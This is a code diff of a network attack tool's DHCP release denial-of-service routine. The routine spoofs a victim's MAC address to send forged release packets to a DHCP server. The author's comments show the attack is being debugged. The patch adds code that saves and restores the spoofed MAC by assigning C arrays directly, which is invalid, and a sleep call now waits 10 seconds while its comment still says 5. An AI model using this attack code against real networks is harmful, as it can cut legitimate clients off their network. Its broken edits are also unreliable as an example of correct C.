@@ -460,9 +460,13 @@ dhcp_send_release(struct attacks *attacks, u_int32_t server, u_int32_t ip, u_int
 { // This bit is called when it's time to actually send the release packet, thus it also might be the cause of the packets not being sent 
     struct dhcp_data *dhcp_data;
 
+    u_int8_t mac_before_spoof[ETHER_ADDR_LEN];
+
     dhcp_data = attacks->data;
 
-    memcpy((void *)dhcp_data->mac_source, (void *)mac_victim, ETHER_ADDR_LEN);
+    mac_before_spoof = dhcp_data->mac_source;
+
+    memcpy((void *)dhcp_data->mac_source, (void *)mac_victim, ETHER_ADDR_LEN); //as this is never reverted, the false MAC stays for next requests
     memcpy((void *)dhcp_data->mac_dest, (void *)mac_server, ETHER_ADDR_LEN);
     
     dhcp_data->sport = DHCP_CLIENT_PORT;
@@ -493,10 +497,12 @@ dhcp_send_release(struct attacks *attacks, u_int32_t server, u_int32_t ip, u_int
     // Let's add some error handling in here, the same way it is implemented in dhcp_send_packet
     if (dhcp_send_packet(attacks) < 0)
     {
+        dhcp_data->mac_source = mac_before_spoof;
         write_log(1,"Error in dhcp_send_packet\n");
         return -1;
     }
 
+    dhcp_data->mac_source = mac_before_spoof;
     return 0;
 }
 
@@ -896,7 +902,7 @@ void dhcp_th_dos_send_release( void *arg )
         write_log(1, "Error in dhcp_learn_mac for the server\n");
         dhcp_th_dos_send_release_exit(attacks);
     }
-    thread_usleep(5000000); // sleep for 5 seconds to see if there's arp throttling
+    thread_usleep(10000000); // sleep for 5 seconds to see if there's arp throttling
     /* loop */
     /* I believe the condition in english is "while current IP is lesser than the value of the last IP and while the attack is not stopped" */
     // If with this setup, the attack successfuly learns the server MAC and the MAC #1 and still fails on #2, then a delay between ARP requests should be implemented
@@ -1073,7 +1079,7 @@ dhcp_learn_mac(struct attacks *attacks, u_int32_t ip_dest, u_int8_t *arp_mac) //
         rec_packets++;
 
         thread_usleep(800000); //have the thread sleep for 0,8 seconds
-
+        
         if ( interfaces_get_packet( attacks->used_ints, NULL, &attacks->attack_th.stop, p_data.header, p_data.packet, PROTO_ARP, 5 ) == NULL ) 
         {
             //Here is the exact moment that the DHCP release DoS fails. If other atacks can make use of this func normally, then it means that ir's an issue with data sent?
